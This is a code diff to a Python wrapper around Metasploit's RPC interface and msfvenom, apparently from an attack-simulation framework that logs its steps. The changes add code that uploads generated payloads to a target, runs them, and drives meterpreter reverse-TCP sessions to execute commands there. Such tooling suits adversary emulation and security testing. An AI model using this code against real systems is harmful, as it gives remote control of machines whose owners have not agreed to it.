@@ -1,20 +1,16 @@
 #!/usr/bin/env python3
 
 from pymetasploit3.msfrpc import MsfRpcClient
-from app.machinecontrol import Machine
+# from app.machinecontrol import Machine
 from app.attack_log import AttackLog
 from app.interface_sfx import CommandlineColors
 import time
+import socket
 
 
 import os
 
 # https://github.com/DanMcInerney/pymetasploit3
-
-# Requirements
-# TODO Connect to metasploit on kali machine
-# TODO Multi sessions
-# Add msfvenom class to generate payloads and fetch them
 
 
 class Metasploit():
@@ -38,21 +34,11 @@ class Metasploit():
             kwargs["server"] = self.attacker.get_ip()
             time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.
 
-        self.get_client()
-        # self.client = MsfRpcClient(password, **kwargs)
-        # TODO: Improve speed and reliability with exception handling and retries
-        # Waiting for reverse shell
-        self.exploit_stub_for_external_payload()
-
-        print("Meterpreter executing")
-        print(self.meterpreter_execute("getuid", 0))
-        print("Done")
-
-    def exploit_stub_for_external_payload(self, exploit='exploit/multi/handler', payload='linux/x64/meterpreter_reverse_tcp'):
-        exploit = self.client.modules.use('exploit', exploit)
+    def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler'):
+        exploit = self.get_client().modules.use('exploit', exploit)
         # print(exploit.description)
         # print(exploit.missing_required)
-        payload = self.client.modules.use('payload', payload)
+        payload = self.get_client().modules.use('payload', payload)
         # print(payload.description)
         # print(payload.missing_required)
         payload["LHOST"] = self.attacker.get_ip()
@@ -73,38 +59,90 @@ class Metasploit():
         self.client = MsfRpcClient(self.password, **self.kwargs)
         return self.client
 
-    def get_sid(self, number=0):
+    def get_sid(self, session_number=0):
         """ Get the first session between hacked target and the metasploit server
 
-        @param number: number of the session to get
+        @param session_number: number of the session to get
         """
 
         # TODO improve stability and speed
-        while len(self.client.sessions.list) <= number:
-            # print(self.client.sessions.list)
-            # print("Waiting for session")
+        print("Get SID")
+        while len(self.get_client().sessions.list) <= session_number:
             time.sleep(1)
-        return list(self.client.sessions.list)[number]
+        print(f"DONE get sid {self.get_client().sessions.list}")
+        return list(self.get_client().sessions.list)[session_number]
 
-    def meterpreter_execute(self, cmd: str, session_number: int) -> str:
-        """ Executes a command on the meterpreter, returns result read from shell
+    def get_sid_to(self, target):
+        """ Get the session to a specified target
 
-        @param cmd: command to execute
-        @param session_number: session number
-        @:return: the string result
+        @param target: a target machine to find in the session list
         """
+
+        # Get_ip can also return a network name. Matching a session needs a real ip
+        ip = socket.gethostbyname(target.get_ip())
+
+        retries = 100
+        while retries > 0:
+            for k, v in self.get_client().sessions.list.items():
+                if v["session_host"] == ip:
+                    print(f"session list: {self.get_client().sessions.list}")
+                    return k
+
+            time.sleep(1)
+            retries -= 1
+        return None  # TODO: Better error handlign as soon as we know where we use it
+
+    def meterpreter_execute(self, cmds: [str], session_number: int) -> str:
+        """ Executes commands on the meterpreter, returns results read from shell
+
+        @param cmds: commands to execute, a list
+        @param session_number: session number
+        @:return: the string results
+        """
+
         shell = self.client.sessions.session(self.get_sid(session_number))
-        shell.write(cmd)
-        return shell.read()
+        res = []
+        for cmd in cmds:
+            shell.write(cmd.strip())
+            res.append(shell.read())
+        return res
+
+    def meterpreter_execute_on(self, cmds: [str], target) -> str:
+        """ Executes commands on the meterpreter, returns results read from shell
+
+        @param cmds: commands to execute, a list
+        @param target: target machine
+        @:return: the string results
+        """
+
+        session_id = self.get_sid_to(target)
+        print(f"Session ID: {session_id}")
+        shell = self.client.sessions.session(session_id)
+        res = []
+        time.sleep(1)
+        for cmd in cmds:
+            shell.write(cmd)
+            retries = 10
+            while retries > 0:
+                r = shell.read()
+                time.sleep(0.5)   # Command needs time to execute
+                retries -= 1
+                if len(r) > 0:
+                    res.append(r)
+                    break
+
+        return res
 
 ##########################################################################
 
 
 class MSFVenom():
-    def __init__(self, attacker: Machine, target: Machine, attack_logger: AttackLog):
+    def __init__(self, attacker, target, attack_logger: AttackLog):
         """
 
         :param attacker: attacker machine
+        :param target: target machine
+        :param attack_logger: The logger for the attack
         """
         # https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 
@@ -194,15 +232,29 @@ class MSFVenom():
             f"{CommandlineColors.OKCYAN}Generated {payload_name}...deploying it{CommandlineColors.ENDC}",
             1)
         # Deploy to target
+        if self.attack_logger:
+            self.attack_logger.start_file_write("", self.target.get_name(), payload_name)
         self.target.put(src, self.target.get_playground())
+        if self.attack_logger:
+            self.attack_logger.stop_file_write("", self.target.get_name(), payload_name)
 
         # TODO run on target
-        if self.target.get_playground() is not None:
-            cmd = f"cd {self.target.get_playground()};"
-        else:
-            cmd = ""
-        cmd += f"chmod +x {payload_name}; ./{payload_name}"
+        if self.target.get_os() == "linux":
+            if self.target.get_playground() is not None:
+                cmd = f"cd {self.target.get_playground()};"
+            else:
+                cmd = ""
+            cmd += f"chmod +x {payload_name}; ./{payload_name}"
+        if self.target.get_os() == "windows":
+            cmd = f'{payload_name}'
+
+        print(cmd)
+
+        if self.attack_logger:
+            self.attack_logger.start_execute_payload("", self.target.get_name(), cmd)
         self.target.remote_run(cmd, disown=True)
+        if self.attack_logger:
+            self.attack_logger.stop_execute_payload("", self.target.get_name(), cmd)
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Executed payload {payload_name} on {self.target.get_name()} {CommandlineColors.ENDC}",
             1)
